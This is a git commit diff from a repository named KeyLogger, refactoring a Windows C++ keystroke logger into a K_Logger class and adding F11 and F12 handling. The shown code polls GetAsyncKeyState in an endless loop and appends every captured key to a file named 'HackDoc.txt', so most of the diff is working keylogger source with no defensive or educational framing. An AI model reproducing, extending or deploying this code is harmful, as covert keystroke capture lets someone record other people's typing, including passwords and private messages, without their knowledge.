404171911bb9fca4eb4a77847041b9055b09e38d
artemakimov01 <artemakimov01@mail.ru>
2018-06-09 13:46:45 +0300

    Added header and refactoring of code

--- KeyLogger/Main.cpp
+++ KeyLogger/Main.cpp
@@ -1,61 +1,8 @@
-#include <iostream>
-#include <Windows.h>
-#include <fstream>
-#include <string>
-#include <time.h>
-
-
-#define VK_MULTIPLY 0x6A;
-#define VK_SPACE 0x20;
-#define VK_ADD 0x6B;
-#define VK_F1 0x70;
-#define VK_TAB 0x09;
-#define VK_LWIN 0x5B;
-#define VK_RETURN 0x0D;
-#define VK_BACK 0x08;
-#define VK_ESCAPE 0x1B; 
-#define VK_UP 0x26;
-#define VK_DOWN 0x28;
-#define VK_DELETE 0x2E;
-#define VK_LEFT 0x25;
-#define VK_RIGHT 0x27;
-#define VK_INSERT 0x2D;
-#define VK_CONTROL 0x11
-#define VK_RBUTTON 0x02;
-#define VK_LBUTTON 0x01;
-#define VK_LSHIFT 0xA0;
-#define VK_RSHIFT 0xA1;
-#define VK_CAPITAL 0x14;
-#define VK_SNAPSHOT 0x2c; 
-#define VK_LMENU 0xA4;
-#define VK_MBUTTON 0x04; 
-#define VK_DIVIDE 0x6F;
-#define VK_SUBTRACT 0x6D;
-#define VK_DECIMAL 0x6E; 
-#define VK_NUMPAD0 0x60;
-#define VK_NUMPAD1 0x61;
-#define VK_NUMPAD2 0x62;
-#define VK_NUMPAD3 0x63;
-#define VK_NUMPAD4 0x64;
-#define VK_NUMPAD5 0x65;
-#define VK_NUMPAD6 0x66;
-#define VK_NUMPAD7 0x67;
-#define VK_NUMPAD8 0x68;
-#define VK_NUMPAD9 0x69;
-#define VK_RWIN 0x5C;
-#define VK_F2 0x71;
-#define VK_F3 0x72;
-#define VK_F4 0x73;
-#define VK_F5 0x74;
-#define VK_F6 0x75;
-#define VK_F7 0x76;
-#define VK_F8 0x77;
-#define VK_F9 0x78;
-#define VK_F10 0x79;
+#include "basic_func.h"
 
 std::string symbol;
 
-void WriteToFile(LPCSTR text)
+void K_Logger::WriteToFile(LPCSTR text)
 {
 	std::ofstream doc_to;
 	doc_to.open("HackDoc.txt", std::fstream::app);
@@ -63,7 +10,7 @@ void WriteToFile(LPCSTR text)
 	doc_to.close();
 }
 
-int SaveSymbol(WORD iKey)
+int K_Logger::SaveSymbol(WORD iKey)
 {
 	switch (iKey)
 	{
@@ -342,6 +289,7 @@ int SaveSymbol(WORD iKey)
 
 
 
+
 		case 0x71:
 			std::cout << "  *F2*  ";
 			WriteToFile("  *F2*  ");
@@ -385,6 +333,17 @@ int SaveSymbol(WORD iKey)
 		case 0x79:
 			std::cout << "  *F10*  ";
 			WriteToFile("  *F10*  ");
+			break;
+
+		case 0x7A:
+			std::cout << "  *F11*  ";
+			WriteToFile("  *F11*  ");
+			break;
+
+
+		case 0x7B:
+			std::cout << "  *F12*  ";
+			WriteToFile("  *F12*  ");
 			break;
 
 		case 0x5C:
@@ -590,6 +549,8 @@ int main()
 
 	char key;
 
+	K_Logger kl;
+
 	while (true)
 	{
 		Sleep(10);
@@ -597,7 +558,7 @@ int main()
 		{
 			if (GetAsyncKeyState(key) == -32767)
 			{
-				SaveSymbol(key);
+				kl.SaveSymbol(key);
 			}
 		}
 	}
